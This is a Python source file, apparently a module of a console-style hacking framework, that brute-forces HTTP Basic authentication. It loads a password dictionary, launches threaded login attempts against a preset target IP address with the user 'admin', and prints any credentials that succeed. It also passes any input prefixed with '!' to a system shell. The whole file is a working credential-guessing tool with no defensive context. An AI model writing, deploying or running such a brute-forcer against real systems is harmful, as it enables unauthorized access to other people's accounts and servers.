#!/usr/bin/env python
#!encoding:utf-8
# BURP Attack Moules
# Created 9/1

import requests
from core import help
from comm import *
from threading import Thread
import Queue

options = ['http://220.247.121.32','admin','/root/Py/psd.txt',15]
thread = str(options[3])
target = options[0]
user   = options[1]
pass_f = options[2]

def burp():
    
    ksf_1 = ksf_line('Burp Web')
    com   = raw_input(ksf_1)
   
    global thread
    global target
    global user
    global pass_f
 
    try:
	if com[0:10] == 'set THREAD':
	    thread = com[11:]     
	    print(tag_true + "set THREAD --> " + thread)
	    burp()
	
	elif com[0:10] == 'set TARGET':
	    target = com[11:]
	    print(tag_true + "set TARGET --> " + target)
	    burp()
    
	elif com[0:8] == 'set DICT':
	    pass_f = com[9:]
	    print(tag_true + "set DICT --> " + pass_f)
	    burp()
	
	elif com[0:8] == 'set USER':
	    user = com[9:]
	    print(tag_true + "set USER --> " + user)
	    burp()

	elif com[0:12] == 'show options':
	    show_op()
	    print("TARGET\t\t"  + target + "\t Target Url")
	    print("USER\t\t"    + user   + "\t\t\t Target User")
	    print("DICT\t\t"    + pass_f + "\t Dict path")
	    print("THREAD\t\t"  + thread + "\t\t\t Thread ")
	    burp()

	elif com[0:1] == '!':
	    os.system(com[1:])
	    burp()
	
	elif com[0:4] == 'help':
	    help.help()
	    burp()
    
	elif com[0:4] == 'back':
	    pass
	
	elif com[0:4] == 'exit':
	    exit(0)

	elif com[0:3] == 'run' or com[0:7] == 'exploit':
	    print_info("[*] Start Burp auth module...")
	    pass_q  = Queue.Queue()
	    headers = {'User-Agent':'Mozilla/5.0 (X11; Linux x86_64; rv:    19.0) Gecko/10100101 Firefox/19.0'}
	    
	    with open(pass_f,'r') as f:
		for line in f.readlines():
		    if not line.startswith('#'):
			pass_q.put(line.rstrip())

	    def scan(target,user):
		while not pass_q.empty():
		    if 'http://' not in target:
			target = 'http://' + target
		    password = pass_q.get()
		    
		    r = requests.get(target,headers=headers,auth=(user,password))
		    if r.status_code == 200:
			print_info("[+] Found:" + target + " --> " + str(user) + ' : ' + str(password))	
			break
	    for t in range(int(thread)):
		Thread(target=scan,args=(target,user)).start()
	    burp()

	else:
	    burp()

    except KeyboardInterrupt:
	print_err("[*] Detected Ctrl-C ,System Exit...")

